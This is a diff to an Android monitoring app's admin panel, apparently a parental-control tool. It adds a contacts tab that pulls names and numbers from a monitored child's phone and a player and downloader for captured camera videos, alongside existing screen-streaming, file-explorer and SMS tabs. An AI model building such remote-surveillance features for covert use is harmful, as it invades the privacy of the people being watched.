@@ -60,6 +60,14 @@ import androidx.compose.ui.graphics.graphicsLayer
 import androidx.compose.ui.geometry.Offset
 import java.text.SimpleDateFormat
 import java.util.*
+import android.util.Base64
+import androidx.compose.ui.viewinterop.AndroidView
+import androidx.media3.common.MediaItem as Media3MediaItem
+import androidx.media3.exoplayer.ExoPlayer
+import androidx.media3.ui.PlayerView
+import java.io.File
+import java.io.FileOutputStream
+import androidx.compose.ui.window.DialogProperties
 
 class MainActivity : ComponentActivity() {
     private val viewModel: AdminViewModel by viewModels()
@@ -108,6 +116,29 @@ fun saveBitmapToGallery(context: Context, bitmap: Bitmap, title: String): Boolea
         } else {
             false
         }
+    } catch (e: Exception) {
+        false
+    }
+}
+
+fun saveVideoToDownloads(context: Context, base64: String, fileName: String): Boolean {
+    return try {
+        val bytes = Base64.decode(base64, Base64.DEFAULT)
+        val contentValues = ContentValues().apply {
+            put(MediaStore.Video.Media.DISPLAY_NAME, "$fileName.mp4")
+            put(MediaStore.Video.Media.MIME_TYPE, "video/mp4")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                put(MediaStore.Video.Media.RELATIVE_PATH, Environment.DIRECTORY_MOVIES + "/SupervisorControl")
+            }
+        }
+        val resolver = context.contentResolver
+        val uri = resolver.insert(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, contentValues)
+        if (uri != null) {
+            resolver.openOutputStream(uri).use { out ->
+                out?.write(bytes)
+            }
+            true
+        } else false
     } catch (e: Exception) {
         false
     }
@@ -1341,7 +1372,8 @@ fun DeviceCommandsTab(
                 CommandItemInfo("live_stream", "البث المباشر للشاشة", "مراقبة شاشة الهاتف لحظياً وبطريقة آمنة بالكامل", Icons.Default.Tv, Color(0xFF39D353)),
                 CommandItemInfo("file_explorer", "مستكشف ملفات الهاتف", "استكشاف وتنزيل ملفات جهاز الطفل بالكامل", Icons.Default.FolderOpen, Color(0xFFFFD54F)),
                 CommandItemInfo("apps", "قائمة التطبيقات وحزمها", "الاطلاع وفلترة التطبيقات المنصبة على الهاتف للأمان", Icons.Default.Apps, Color(0xFFFF4081)),
-                CommandItemInfo("sms", "الرسائل وتنبيهات الأمان", "مزامنة الرسائل النصية والتنبيهات المكتشفة بالهاتف", Icons.Default.Sms, Color(0xFFFF9100))
+                CommandItemInfo("sms", "الرسائل وتنبيهات الأمان", "مزامنة الرسائل النصية والتنبيهات المكتشفة بالهاتف", Icons.Default.Sms, Color(0xFFFF9100)),
+                CommandItemInfo("contacts", "سجل جهات الاتصال", "عرض الأسماء والأرقام المسجلة في هاتف الطفل", Icons.Default.ContactPhone, Color(0xFF9155FF))
             )
 
             cmdItems.forEach { cmd ->
@@ -1390,6 +1422,7 @@ fun DeviceCommandsTab(
                         "file_explorer" -> "مستكشف الملفات البعيد للطفل"
                         "apps" -> "إدارة وجرد التطبيقات المثبتة"
                         "sms" -> "الأرشيف والرسائل وتنبيهات الأمان"
+                        "contacts" -> "سجل جهات الاتصال"
                         else -> "لوحة التحكم بالأمر"
                     },
                     color = Color.White,
@@ -1406,6 +1439,7 @@ fun DeviceCommandsTab(
                     "file_explorer" -> RemoteFileExplorerTab(viewModel)
                     "apps" -> InstalledAppsRequirementsPage(viewModel)
                     "sms" -> SmsAndSecurityAlertsTab(viewModel)
+                    "contacts" -> ContactsTab(viewModel)
                 }
             }
         }
@@ -1445,6 +1479,7 @@ fun ScreenshotRequirementsPage(viewModel: AdminViewModel) {
     val cameraVideos by viewModel.cameraVideos.collectAsState()
     val context = LocalContext.current
     var fullscreenBitmap by remember { mutableStateOf<Bitmap?>(null) }
+    var playingVideo by remember { mutableStateOf<MediaItem?>(null) }
     var selectedSubTab by remember { mutableIntStateOf(0) }
 
     Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
@@ -1498,7 +1533,11 @@ fun ScreenshotRequirementsPage(viewModel: AdminViewModel) {
                     Spacer(Modifier.height(16.dp))
                     LazyColumn(modifier = Modifier.fillMaxSize(), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                         items(cameraVideos) { video ->
-                            Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = Color(0xFF161B22)), border = BorderStroke(1.dp, Color(0xFF30363D))) {
+                            Card(
+                                modifier = Modifier.fillMaxWidth().clickable { playingVideo = video },
+                                colors = CardDefaults.cardColors(containerColor = Color(0xFF161B22)),
+                                border = BorderStroke(1.dp, Color(0xFF30363D))
+                            ) {
                                 Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                                     Icon(Icons.Default.PlayCircle, null, tint = Color(0xFFDA3633))
                                     Spacer(Modifier.width(12.dp))
@@ -1531,6 +1570,21 @@ fun ScreenshotRequirementsPage(viewModel: AdminViewModel) {
                 Image(bmp.asImageBitmap(), null, modifier = Modifier.fillMaxWidth(0.95f), contentScale = ContentScale.Fit)
             }
         }
+    }
+
+    playingVideo?.let { video ->
+        VideoPlayerDialog(
+            videoBase64 = video.base64,
+            onDismiss = { playingVideo = null },
+            onDownload = {
+                val success = saveVideoToDownloads(context, video.base64, "video_${video.timestamp}")
+                if (success) {
+                    Toast.makeText(context, "تم حفظ الفيديو بجهازك (في الأفلام)", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(context, "فشل حفظ الفيديو", Toast.LENGTH_SHORT).show()
+                }
+            }
+        )
     }
 }
 
@@ -2644,6 +2698,62 @@ fun RemoteFileExplorerTab(viewModel: AdminViewModel) {
 
 // 6. TAB 4: LIVE RECEPTION - SMS & SECURITY ALERTS
 @Composable
+fun ContactsTab(viewModel: AdminViewModel) {
+    val contacts by viewModel.contacts.collectAsState()
+    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
+        Button(
+            onClick = { viewModel.requestContacts() },
+            modifier = Modifier.fillMaxWidth(),
+            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))
+        ) {
+            Icon(Icons.Default.Refresh, null, modifier = Modifier.size(18.dp))
+            Spacer(Modifier.width(8.dp))
+            Text("تحديث جهات الاتصال")
+        }
+        Spacer(Modifier.height(16.dp))
+        LazyColumn(
+            modifier = Modifier.weight(1f),
+            verticalArrangement = Arrangement.spacedBy(8.dp)
+        ) {
+            items(contacts) { contact ->
+                Card(
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = CardDefaults.cardColors(containerColor = Color(0xFF161B22)),
+                    border = BorderStroke(1.dp, Color(0xFF30363D))
+                ) {
+                    Row(
+                        modifier = Modifier.padding(12.dp),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Surface(
+                            modifier = Modifier.size(40.dp),
+                            shape = CircleShape,
+                            color = Color(0xFF9155FF).copy(alpha = 0.2f)
+                        ) {
+                            Box(contentAlignment = Alignment.Center) {
+                                Icon(Icons.Default.Person, null, tint = Color(0xFF9155FF), modifier = Modifier.size(20.dp))
+                            }
+                        }
+                        Spacer(Modifier.width(12.dp))
+                        Column {
+                            Text(contact.name, color = Color.White, fontSize = 14.sp, fontWeight = FontWeight.Bold)
+                            Text(contact.number, color = Color(0xFF8B949E), fontSize = 12.sp)
+                        }
+                    }
+                }
+            }
+            if (contacts.isEmpty()) {
+                item {
+                    Box(Modifier.fillMaxWidth().height(100.dp), contentAlignment = Alignment.Center) {
+                        Text("لا توجد جهات اتصال متاحة، جرب التحديث.", color = Color(0xFF8B949E), fontSize = 12.sp)
+                    }
+                }
+            }
+        }
+    }
+}
+
+@Composable
 fun SmsAndSecurityAlertsTab(viewModel: AdminViewModel) {
     val smsLogs by viewModel.smsLogs.collectAsState()
     val securityAlerts by viewModel.securityAlerts.collectAsState()
@@ -3359,6 +3469,12 @@ fun SwipeToRefreshBox(
 ) {
     var dragOffsetY by remember { mutableStateOf(0f) }
     val maxDrag = 250f
+
+    LaunchedEffect(isRefreshing) {
+        if (!isRefreshing) {
+            dragOffsetY = 0f
+        }
+    }
     
     val nestedScrollConnection = remember {
         object : NestedScrollConnection {
@@ -3442,6 +3558,89 @@ fun SwipeToRefreshBox(
                             .graphicsLayer {
                                 rotationZ = (dragOffsetY / maxDrag) * 360f
                             }
+                    )
+                }
+            }
+        }
+    }
+}
+
+@Composable
+fun VideoPlayerDialog(
+    videoBase64: String,
+    onDismiss: () -> Unit,
+    onDownload: () -> Unit
+) {
+    val context = LocalContext.current
+    val exoPlayer = remember {
+        ExoPlayer.Builder(context).build().apply {
+            try {
+                val bytes = Base64.decode(videoBase64, Base64.DEFAULT)
+                val tempFile = File(context.cacheDir, "temp_video_play.mp4")
+                val fos = FileOutputStream(tempFile)
+                fos.write(bytes)
+                fos.close()
+                setMediaItem(Media3MediaItem.fromUri(tempFile.absolutePath))
+                prepare()
+                playWhenReady = true
+            } catch (e: Exception) {
+                Toast.makeText(context, "خطأ في تشغيل الفيديو: ${e.message}", Toast.LENGTH_SHORT).show()
+                onDismiss()
+            }
+        }
+    }
+
+    DisposableEffect(Unit) {
+        onDispose {
+            exoPlayer.release()
+        }
+    }
+
+    Dialog(
+        onDismissRequest = onDismiss,
+        properties = DialogProperties(usePlatformDefaultWidth = false)
+    ) {
+        Card(
+            modifier = Modifier
+                .fillMaxWidth(0.95f)
+                .fillMaxHeight(0.8f),
+            colors = CardDefaults.cardColors(containerColor = Color(0xFF0D1117)),
+            shape = RoundedCornerShape(16.dp),
+            border = BorderStroke(1.dp, Color(0xFF30363D))
+        ) {
+            Column {
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .padding(16.dp),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text("مشغل الفيديو", color = Color.White, fontWeight = FontWeight.Bold)
+                    Row {
+                        IconButton(onClick = onDownload) {
+                            Icon(Icons.Default.Download, "تنزيل", tint = Color.White, modifier = Modifier.size(20.dp))
+                        }
+                        IconButton(onClick = onDismiss) {
+                            Icon(Icons.Default.Close, "إغلاق", tint = Color.White, modifier = Modifier.size(20.dp))
+                        }
+                    }
+                }
+                Box(
+                    modifier = Modifier
+                        .weight(1f)
+                        .fillMaxWidth()
+                        .background(Color.Black),
+                    contentAlignment = Alignment.Center
+                ) {
+                    AndroidView(
+                        factory = { ctx ->
+                            PlayerView(ctx).apply {
+                                player = exoPlayer
+                                useController = true
+                            }
+                        },
+                        modifier = Modifier.fillMaxSize()
                     )
                 }
             }
